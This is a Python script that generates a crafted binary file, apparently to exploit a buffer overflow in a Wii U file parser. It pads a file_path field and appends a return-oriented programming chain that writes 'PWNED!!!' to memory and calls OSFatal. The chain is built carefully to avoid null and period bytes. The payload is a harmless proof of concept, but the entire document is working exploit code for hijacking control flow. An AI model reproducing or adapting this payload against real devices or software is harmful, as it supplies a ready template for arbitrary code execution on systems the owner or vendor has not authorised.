import sys
import struct
sys.path.append("..")
from common.ropgadgets import *

rawData = struct.pack('>I', 1) # Add number of texture information

# Start to write our malicious file_path. Must not contain '\0' or '.'
rawData += b'\x20' * 0x24

# Add ropchain :) Make sure not to use '\0' or '.' inside the rop chain.
rop_chain = []
rop_chain += write32(0x100105ec,0x50574E45) # Write 'PWNE' to 0x0x100105ec
rop_chain += write32(0x100105f0,0x44212121) # Write 'D!!!' to 0x0x100105f0
rop_chain += OSFatal(0x100105ec)            # Call OSFatal((char*)0x100105ec)

for val in rop_chain:
    rawData += struct.pack('>I', val)
    
if len(rawData) > 0x04 + 0x100:
    print("Error: payload it too long.");
else :
    file_path = r'common_wiiu_json.bin'

    with open(file_path, 'wb') as file:
        # Write the rawData to the file
        file.write(rawData)